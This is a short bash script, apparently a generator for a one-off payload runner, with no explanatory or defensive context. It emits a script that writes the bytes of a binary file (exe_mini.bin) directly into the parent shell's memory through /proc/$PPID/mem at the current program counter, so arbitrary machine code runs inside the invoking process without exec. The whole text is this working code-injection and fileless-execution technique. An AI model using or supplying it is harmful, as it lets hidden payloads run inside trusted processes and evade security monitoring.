#!/bin/bash

filename=exe_mini.bin

cat <<EOF
pc=\$(cut -d ' ' -f9 /proc/\$PPID/syscall)
exec {fd}<>/proc/\$PPID/mem
<&\$fd cmp -n 0 - - \$pc
printf '$(hexdump -e '"\\"  /1 "x%02x"' $filename)' >&\$fd
echo Have fun ...>&2
EOF
